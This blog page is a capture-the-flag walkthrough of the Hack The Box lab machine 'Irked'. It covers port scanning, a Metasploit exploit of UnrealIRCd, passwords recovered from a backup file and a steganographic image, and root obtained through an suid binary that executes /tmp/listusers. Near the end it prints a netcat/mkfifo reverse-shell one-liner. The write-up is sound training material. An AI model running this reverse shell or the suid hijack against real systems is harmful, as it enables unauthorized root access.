<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Irked - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Irked"><a href="#Hack-The-Box-Irked" class="headerlink" title="Hack The Box - Irked"></a>Hack The Box - Irked</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, today Irked retired and here’s my write-up about it. It was an easy straightforward machine, no rabbit holes and such things. To get an initial shell on the box we will exploit an RCE vulnerable irc server called <code>UnrealIRCd</code>. After getting a shell we will find a backup file which has a password. We will use that password to get a hidden text file from an image (steg). That text file contains another password which we will use to get ssh access as another user. Finally for privilege escalation there is an <code>suid</code> binary that executes a file, and we control that file so we can get a reverse shell as root. It’s a linux box and its ip is <code>10.10.10.117</code>. I added it to <code>/etc/hosts</code> as <code>irked.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/irked/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with nmap to scan for open ports and services :<br><code>nmap -sV -sT -sC irked.htb</code><br><img src="/images/hackthebox/irked/1.png" alt=""><br>There is ssh running on port 22 and http running on port 80. Let’s take a look at http.</p>
<h2 id="HTTP-Initial-Enumeration"><a href="#HTTP-Initial-Enumeration" class="headerlink" title="HTTP Initial Enumeration"></a>HTTP Initial Enumeration</h2><p><img src="/images/hackthebox/irked/2.png" alt=""><br>There is only that image and a message saying : <code>IRC is almost working!</code>, Source also has nothing interesting :<br><img src="/images/hackthebox/irked/3.png" alt=""><br>We have a hint which is irc, let’s check that. If we didn’t find anything then we will continue with http.</p>
<h2 id="IRC"><a href="#IRC" class="headerlink" title="IRC"></a>IRC</h2><p>I searched for irc and found <a href="https://en.wikipedia.org/wiki/Internet_Relay_Chat#Technical_information" target="_blank" rel="noopener">here</a> That if there is an irc server running on the machine, then probably it will be in the port range from 6000 to 7000. So I ran another nmap scan :<br><code>nmap -p 6000-7000 -sV -sT -sC irked.htb</code><br><img src="/images/hackthebox/irked/4.png" alt=""><br>There is an irc server running on port 6697 called <code>UnrealIRCd</code>. There are some known vulnerabilities for <code>UnrealIRCd</code>, One of them is a Remote Code Execution and there is a metasploit module for it :<br><img src="/images/hackthebox/irked/5.png" alt=""><br>Let’s check if the server is vulnerable to it.<br><img src="/images/hackthebox/irked/6.png" alt=""><br><img src="/images/hackthebox/irked/7.png" alt=""><br>It worked and we got a shell as <code>ircd</code> :<br><img src="/images/hackthebox/irked/8.png" alt=""></p>
<h2 id="Steg-in-irked-jpg-SSH-as-djmardov"><a href="#Steg-in-irked-jpg-SSH-as-djmardov" class="headerlink" title="Steg in irked.jpg, SSH as djmardov"></a>Steg in <code>irked.jpg</code>, SSH as <code>djmardov</code></h2><p>There are two users on the box : <code>ircd</code> and <code>djmardov</code>. I checked <code>/home/ircd</code> and there was nothing interesting. In <code>/home/djmardov</code> I didn’t find <code>user.txt</code> :<br><img src="/images/hackthebox/irked/9.png" alt=""><br>I tried to go into <code>.ssh</code> but I got <code>Permission denied</code> :<br><img src="/images/hackthebox/irked/10.png" alt=""><br>I checked other directories like <code>Desktop</code>, <code>Downloads</code>, <code>Documents</code> etc… And in <code>Documents</code> I found <code>user.txt</code> and a file called <code>.backup</code> :<br><img src="/images/hackthebox/irked/11.png" alt=""><br><code>cat .backup</code><br><img src="/images/hackthebox/irked/12.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Super elite steg backup pw</span><br><span class="line">UPupDOWNdownLRlrBAbaSSss</span><br></pre></td></tr></table></figure>
<p>It gives us a hint about some steg backup, we also get something that looks like a password : <code>UPupDOWNdownLRlrBAbaSSss</code>. But where will we use that password ? Remember the image we saw earlier on that apache server ?<br><img src="/images/hackthebox/irked/2.png" alt=""><br><img src="/images/hackthebox/irked/3.png" alt=""><br>I downloaded it then used <code>steghide</code> to check if there is any hidden file.<br>Note : I have a list for some steganography tools, If you are not familiar with steg you can check it <a href="/lists/stego">here</a>.<br><code>wget http://irked.htb/irked.jpg</code><br><img src="/images/hackthebox/irked/13.png" alt=""><br><code>steghide info irked.jpg</code><br><img src="/images/hackthebox/irked/14.png" alt=""><br>There is a hidden text file called <code>pass.txt</code>, Let’s extract it :<br><code>steghide extract -sf irked.jpg</code><br><img src="/images/hackthebox/irked/15.png" alt=""><br><code>cat pass.txt</code><br><img src="/images/hackthebox/irked/16.png" alt=""><br>We got the password : <code>Kab6h+m+bbp2J:HG</code>, let’s try to login as <code>djmardov</code> :<br><img src="/images/hackthebox/irked/17.png" alt=""><br>We owned user !</p>
<h2 id="Exploiting-viewuser-Privilege-Escalation-to-root"><a href="#Exploiting-viewuser-Privilege-Escalation-to-root" class="headerlink" title="Exploiting viewuser, Privilege Escalation to root"></a>Exploiting <code>viewuser</code>, Privilege Escalation to <code>root</code></h2><p>After some enumeration, I searched for <code>suid</code> binaries and in <code>/usr/bin</code> I found a binary called <code>viewuser</code>.<br><code>find /usr/bin/ -perm -4000</code><br><img src="/images/hackthebox/irked/18.png" alt=""><br>It seems interesting so I decided to check it.<br><code>viewuser</code><br><img src="/images/hackthebox/irked/19.png" alt=""><br>It shows logged in users, but we don’t care about that. The only thing we care about is the last line : <code>/tmp/listusers: 1: /tmp/listusers: djmardov: not found</code>. It seems like it was trying to do something with the file <code>/tmp/listusers</code> which doesn’t exist. I downloaded <code>viewuser</code> to try some stuff :<br><code>scp djmardov@irked.htb:/usr/bin/viewuser ./</code><br><img src="/images/hackthebox/irked/20.png" alt=""><br>When I did <code>ltrace</code> on the binary I found that it executes <code>/tmp/listusers</code> :<br><img src="/images/hackthebox/irked/21.png" alt=""><br>And since this binary runs as root, then it also executes <code>/tmp/listusers</code> as root. So we can simply get a reverse shell by putting the payload in <code>/tmp/listusers</code>, Then after running the binary again it should execute the payload.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f"</span> &gt; /tmp/listusers</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/irked/22.png" alt=""><br>Everything is fine, let’s check our listener :<br><img src="/images/hackthebox/irked/23.png" alt=""><br><img src="/images/hackthebox/irked/24.png" alt=""><br>Now we own root ! </p>
<p>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/teacher/">Hack The Box - Teacher</a><br>Next Hack The Box write-up : <a href="/hack-the-box/bighead/">Hack The Box - BigHead</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-04-27</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/binary-exploitation/" rel="tag">#binary-exploitation</a> <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/reverse-engineering/" rel="tag">#reverse-engineering</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#ssh</a> <a class="tag-link" href="/tags/steganography/" rel="tag">#steganography</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
